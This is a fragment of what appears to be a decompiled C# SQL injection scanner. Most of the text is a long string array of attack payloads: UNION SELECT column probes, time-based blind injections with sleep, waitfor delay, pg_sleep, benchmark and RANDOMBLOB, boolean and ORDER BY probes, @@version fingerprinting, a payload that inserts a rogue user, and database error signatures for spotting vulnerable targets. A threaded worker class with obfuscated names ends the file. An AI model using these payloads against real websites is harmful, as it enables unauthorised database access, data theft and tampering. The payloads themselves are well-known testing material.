"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX'#",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",
"# from wapiti",
"sleep(5)#",
"1 or sleep(5)#",
"' or sleep(5)='",
"1) or sleep(5)#",
"') or sleep(5)='",
"1)) or sleep(5)#",
"')) or sleep(5)='",
";waitfor delay '0:0:5'--",
");waitfor delay '0:0:5'--",
"';waitfor delay '0:0:5'--",
"');waitfor delay '0:0:5'--",
"));waitfor delay '0:0:5'--",
  "'));waitfor delay '0:0:5'--",
"benchmark(10000000,MD5(1))#",
   "1 or benchmark(10000000,MD5(1))#",
"1) or benchmark(10000000,MD5(1))#",
"1)) or benchmark(10000000,MD5(1))#",
",pg_sleep(5)--",
"1 or pg_sleep(5)--",
"' or pg_sleep(5)--",
"') or pg_sleep(5)--",
"1)) or pg_sleep(5)--",
"')) or pg_sleep(5)--",
"AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe",
"AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='",
"AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)",
"AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--",
"AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#",
"SLEEP(5)#",
"SLEEP(5)--",
"SLEEP(5)='",
"or SLEEP(5)",
"or SLEEP(5)#",
"or SLEEP(5)--",
"or SLEEP(5)='",
"waitfor delay '00:00:05'",
"waitfor delay '00:00:05'--",
"waitfor delay '00:00:05'#",
"benchmark(50000000,MD5(1))",
"benchmark(50000000,MD5(1))--",
"benchmark(50000000,MD5(1))#",
"or benchmark(50000000,MD5(1))",
"or benchmark(50000000,MD5(1))--",
"or benchmark(50000000,MD5(1))#",
"pg_SLEEP(5)",
"pg_SLEEP(5)--",
"pg_SLEEP(5)#",
"or pg_SLEEP(5)",
"or pg_SLEEP(5)--",
"or pg_SLEEP(5)#",
"'\"",
"AnD SLEEP(5)",
"AnD SLEEP(5)--",
"AnD SLEEP(5)#",
"&&SLEEP(5)",
"&&SLEEP(5)--",
"&&SLEEP(5)#",
"' AnD SLEEP(5) ANd '1",
"'&&SLEEP(5)&&'1",
"ORDER BY SLEEP(5)",
"ORDER BY SLEEP(5)--",
"ORDER BY SLEEP(5)#",
"(SELECT * FROM (SELECT(SLEEP(5)))ecMj)",
"(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#",
"(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--",
"+benchmark(3200,SHA1(1))+'",
"+ SLEEP(10) + '",
"RANDOMBLOB(500000000/2)",
"AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
"OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
",RANDOMBLOB(1000000000/2)",
"AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
"OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
"SLEEP(1)/*' or SLEEP(1) or '",
"OR 1=1",
"OR 1=0",
"OR x=x",
"OR x=y",
"OR 1=1#",
"OR 1=0#",
"OR x=x#",
"OR x=y#",
"OR 1=1-- ",
"OR 1=0-- ",
"OR x=x-- ",
"OR x=y-- ",
"OR 3409=3409 AND ('pytW' LIKE 'pytW",
"OR 3409=3409 AND ('pytW' LIKE 'pytY",
"HAVING 1=1",
"HAVING 1=0",
"HAVING 1=1#",
"HAVING 1=0#",
"HAVING 1=1-- ",
"HAVING 1=0-- ",
"AND 1=1",
"AND 1=0",
"AND 1=1--",
"AND 1=0-- ",
"AND 1=1#",
"AND 1=0#",
"AND 1=1 AND '%'='",
"AND 1=0 AND '%'='",
"AND 1083=1083 AND (1427=1427",
"AND 7506=9091 AND (5913=5913",
"AND 1083=1083 AND ('1427=1427",
"AND 7506=9091 AND ('5913=5913",
"AND 7300=7300 AND 'pKlZ'='pKlZ",
"AND 7300=7300 AND 'pKlZ'='pKlY",
"AND 7300=7300 AND ('pKlZ'='pKlZ",
"AND 7300=7300 AND ('pKlZ'='pKlY",
"AS INJECTX WHERE 1=1 AND 1=1",
"AS INJECTX WHERE 1=1 AND 1=0",
"AS INJECTX WHERE 1=1 AND 1=1#",
"AS INJECTX WHERE 1=1 AND 1=0#",
"AS INJECTX WHERE 1=1 AND 1=1--",
"AS INJECTX WHERE 1=1 AND 1=0--",
"WHERE 1=1 AND 1=1",
"WHERE 1=1 AND 1=0",
"WHERE 1=1 AND 1=1#",
"WHERE 1=1 AND 1=0#",
"WHERE 1=1 AND 1=1--",
"WHERE 1=1 AND 1=0--",
"ORDER BY 1-- ",
"ORDER BY 2-- ",
"ORDER BY 3-- ",
"ORDER BY 4-- ",
"ORDER BY 5-- ",
"ORDER BY 6-- ",
"ORDER BY 7-- ",
"ORDER BY 8-- ",
"ORDER BY 9-- ",
"ORDER BY 10-- ",
"ORDER BY 11-- ",
"ORDER BY 12-- ",
"ORDER BY 13-- ",
"ORDER BY 14-- ",
"ORDER BY 15-- ",
"ORDER BY 16-- ",
"ORDER BY 17-- ",
"ORDER BY 18-- ",
"ORDER BY 19-- ",
"ORDER BY 20-- ",
"ORDER BY 21-- ",
"ORDER BY 22-- ",
"ORDER BY 23-- ",
"ORDER BY 24-- ",
"ORDER BY 25-- ",
"ORDER BY 26-- ",
"ORDER BY 27-- ",
"ORDER BY 28-- ",
"ORDER BY 29-- ",
"ORDER BY 30-- ",
"ORDER BY 31337--",
"ORDER BY 1# ",
"ORDER BY 2# ",
"ORDER BY 3# ",
"ORDER BY 4# ",
"ORDER BY 5# ",
"ORDER BY 6# ",
"ORDER BY 7# ",
"ORDER BY 8# ",
"ORDER BY 9# ",
"ORDER BY 10# ",
"ORDER BY 11# ",
"ORDER BY 12# ",
"ORDER BY 13# ",
"ORDER BY 14# ",
"ORDER BY 15# ",
"ORDER BY 16# ",
"ORDER BY 17# ",
"ORDER BY 18# ",
"ORDER BY 19# ",
"ORDER BY 20# ",
"ORDER BY 21# ",
"ORDER BY 22# ",
"ORDER BY 23# ",
"ORDER BY 24# ",
"ORDER BY 25# ",
"ORDER BY 26# ",
"ORDER BY 27# ",
"ORDER BY 28# ",
"ORDER BY 29# ",
"ORDER BY 30#",
"ORDER BY 31337#",
"ORDER BY 1 ",
"ORDER BY 2 ",
"ORDER BY 3 ",
"ORDER BY 4 ",
"ORDER BY 5 ",
"ORDER BY 6 ",
"ORDER BY 7 ",
"ORDER BY 8 ",
"ORDER BY 9 ",
"ORDER BY 10 ",
"ORDER BY 11 ",
"ORDER BY 12 ",
"ORDER BY 13 ",
"ORDER BY 14 ",
"ORDER BY 15 ",
"ORDER BY 16 ",
"ORDER BY 17 ",
"ORDER BY 18 ",
"ORDER BY 19 ",
"ORDER BY 20 ",
"ORDER BY 21 ",
"ORDER BY 22 ",
"ORDER BY 23 ",
"ORDER BY 24 ",
"ORDER BY 25 ",
"ORDER BY 26 ",
"ORDER BY 27 ",
"ORDER BY 28 ",
"ORDER BY 29 ",
"ORDER BY 30 ",
"ORDER BY 31337 ",
"RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
"RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
"IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--",
"IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--",
"%' AND 8310=8310 AND '%'='",
"%' AND 8310=8311 AND '%'='",
"and (select substring(@@version,1,1))='X'",
"and (select substring(@@version,1,1))='M'",
"and (select substring(@@version,2,1))='i'",
"and (select substring(@@version,2,1))='y'",
"and (select substring(@@version,3,1))='c'",
"and (select substring(@@version,3,1))='S'",
"and (select substring(@@version,3,1))='X'",
"[phpBB Debug] PHP Warning: in file [ROOT]",
"Warning: preg_match_all()",
"Warning: Illegal string offset 'active'",
"Fatal error: Uncaught Error:",
"Warning: Invalid argument supplied for foreach()",
"Warning: array_rand():",
"Deprecated: mysql_connect():",
"' HAVING 1=1 --",
"' GROUP BY table.columnfromerror1 HAVING 1=1 --",
"' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --",
"' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 --",
"' union select sum(columntofind) from users-- (S) ",
"Microsoft OLE DB Provider for ODBC Drivers error '80040e07' ",
"[Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a varchar data type as an argument.",
"SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, ",
"convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--",
"11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –-",
"11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –-",
"11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 -- ",
"11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –-",
"11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –-",
"Microsoft OLE DB Provider for SQL Server error '80040e07' ",
"Explicit conversion from data type int to image is not allowed.",
"'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/*",
"WAITFOR DELAY '0:0:10'--",
"WAITFOR DELAY '0:0:0.51'",
"1;waitfor delay '0:0:10'--",
"ProductID =1);waitfor delay '0:0:10'--",
"ProductID =1';waitfor delay '0:0:10'--",
"ProductID =1');waitfor delay '0:0:10'--",
"ProductID =1));waitfor delay '0:0:10'--",
"ProductID =1'));waitfor delay '0:0:10'--",
"SELECT pg_sleep(10); ",
"SELECT sleep(10); ",
"(SELECT CASE WHEN (NVL(ASCII(SUBSTR(({INJECTION}),1,1)),0) = 100) THEN dbms_pipe.receive_message(('xyz'),10) ELSE dbms_pipe.receive_message(('xyz'),1) END FROM dual)",
		"driver][mysqld"
	};

	private static int scanned;

	private sealed class Class1
	{
		internal void method_0(object object_0)
		{
			Class0.smethod_11(this.int_0);
		}

		public int int_0;

		public ParameterizedThreadStart parameterizedThreadStart_0;
	}
}
